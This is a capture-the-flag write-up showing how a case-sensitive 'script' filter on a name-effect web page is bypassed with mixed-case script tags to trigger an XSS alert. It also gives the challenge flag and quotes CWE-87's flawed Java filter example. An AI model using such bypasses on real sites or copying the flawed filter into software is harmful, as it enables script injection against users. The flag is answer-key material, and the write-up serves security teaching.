## Cool Name Effect

### The Problem:

> Webmaster developed a simple script to do cool effects on your name, but his code not filtering the inputs correctly execute javascript alert and prove it. (http://34.77.37.110/cool-effect/)

### The Solution:

- `<script>alert(1)</script>` gives -> `<[forbidden]>alert(1)<[forbidden]>` -> non-standard filter and possible XSS.  
- `<sCript>alert(1)</scriPt>`


### The flag: 
`ciyypjz`

### Notes:
- OWASP TOP 10 `Cross-Site Scripting (XSS)`.
- CWE-87:
  > The software does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.   
  
  - In the following example, an XSS neutralization routine checks for the lower-case "script" string but does not account for alternate strings ("SCRIPT", for example):  
  ```
  public String preventXSS(String input, String mask) {
      return input.replaceAll("script", mask);
  }
  ```



